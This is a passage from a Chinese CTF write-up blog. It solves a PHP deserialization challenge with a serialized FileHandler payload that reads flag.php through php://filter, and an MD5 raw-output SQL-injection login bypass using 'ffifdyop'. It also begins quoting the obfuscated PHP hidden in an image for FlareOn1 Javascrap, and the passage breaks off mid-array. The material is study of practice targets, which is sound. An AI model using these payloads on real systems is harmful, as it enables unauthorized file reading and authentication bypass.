title="分析代码"></a>分析代码</h3><p>一眼看到<code>unserialize</code>（大体就是考查反序列化了），然后有一个判断。<code>is_valid($str)</code>,上网找了半天，结果这是一个自建函数。emmm…无语啦。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">#其功能就是限制输入的字符长度为32-125（转化为ascii后）</span><br></code></pre></td></tr></table></figure><p>然后想到魔法函数的调用。这里直接引用h3师傅的文章。copy过来。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">__destruct()：<span class="hljs-regexp">//</span>析构函数当对象被销毁时会被自动调用<br>__wakeup(): <span class="hljs-regexp">//u</span>nserialize()时会被自动调用<br>__invoke(): <span class="hljs-regexp">//</span>当尝试以调用函数的方法调用一个对象时，会被自动调用<br>__call(): <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br>__callStatci(): <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br>__get(): <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br>__set(): <span class="hljs-regexp">//</span>用于将数据写入不可访问的属性<br>__isset(): <span class="hljs-regexp">//</span>在不可访问的属性上调用isset()或empty()触发<br>__unset(): <span class="hljs-regexp">//</span>在不可访问的属性上使用unset()时触发<br>__toString(): <span class="hljs-regexp">//</span>把类当作字符串使用时触发<br>__construct(): <span class="hljs-regexp">//</span>构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用<br>__sleep(): <span class="hljs-regexp">//</span>serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用<br></code></pre></td></tr></table></figure><p>这里就可以直接看看<code>_destruct()</code>干了什么。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><span class="hljs-comment">#op初始值为1</span><br></code></pre></td></tr></table></figure><p>继续跟<code>process()</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>         <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>很显然需要进入<code>read()</code>函数。这里<code>output</code>，会将返回结果输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然这里就可以用php:&#x2F;&#x2F;filter伪协议读取文件。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1、需要在进入<code>process</code>之前将op的值改为2。</p><p>2、构造filenaem&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210434.png" alt="QQ截图20220223160637"></p><p>这里不知道什么原因。搜了一下wp。看wp的时候发现自己的伪协议写错了。emmm…手动添加<code>//</code>，并且手动改变wp。<code>55</code>–<code>57</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210005.png" alt="QQ截图20220223160814"></p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="Base64解码"><a href="#Base64解码" class="headerlink" title="Base64解码"></a>Base64解码</h3><p>结束。</p><h2 id="SWPUCTF-2016-Web7"><a href="#SWPUCTF-2016-Web7" class="headerlink" title="[SWPUCTF 2016]Web7"></a>[SWPUCTF 2016]Web7</h2><p>这题相对来说就比较简单。简单记录一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183715.png" alt="QQ截图20220218183715"></p><p>如何绕过呢？百度一瞧。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210449.png" alt="QQ截图20220218183842"></p><p><strong>师傅已经讲得很详细了，总而言之就是当注入的pass&#x3D;ffifdyop时，ffifdyop经过md5加密后变成 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 被返回， ‘ \ ‘后面的3个字符连同’ \ ‘算一个字符，比如’  \xc9 ‘，所以上述一共16个字符。函数md5($pass,true)返回为true。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210428.png" alt="QQ截图20220218184141"></p><p>查看源码 MD5简单绕过，然后依旧MD5简单绕过。<br>结束。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210962.png" alt="QQ截图20220218184328"></p><h2 id="FlareOn1-Javascrap"><a href="#FlareOn1-Javascrap" class="headerlink" title="[FlareOn1]Javascrap"></a>[FlareOn1]Javascrap</h2><p>给了压缩包直接下载一下。winhex查看图片。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$terms</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-variable">$order</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">13</span>, <span class="hljs-number">35</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">81</span>, <span class="hljs-number">76</span>, <span class="hljs-number">10</span>, <span class="hljs-number">28</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">11</span>, <span class="hljs-number">76</span>, <span class="hljs-number">68</span>, <span class="hljs-number">50</span>, <span class="hljs-number">30</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">45</span>, <span class="hljs-number">20</span>, <span class="hljs-number">23</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">63</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">23</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">49</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">66</span>, <span class="hljs-number">3</span>, <span class="hljs-number">86</span>, <span class="hljs-number">27</span>, <span class="hljs-number">88</span>, <span class="hljs-number">77</span>, <span class="hljs-number">80</span>, <span class="hljs-number">38</span>, <span class="hljs-number">25</span>, <span class="hljs-number">40</span>, <span class="hljs-number">81</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">76</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">7</span>, <span class="hljs-number">88</span>, <span class="hljs-number">32</span>, <span class="hljs-number">45</span>, <span class="hljs-number">7</span>, <span class="hljs-number">90</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">66</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">11</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">91</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">12</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">11</span>, <span class="hljs-number">79</span>, <span class="hljs-number">28</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">42</span>, <span class="hljs-number">23</span>, <span class="hljs-number">88</span>, <span class="hljs-number">30</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">35</span>, <span class="hljs-number">68</span>, <span class="hljs-number">38</span>, <span class="hljs-number">63</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">30</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span 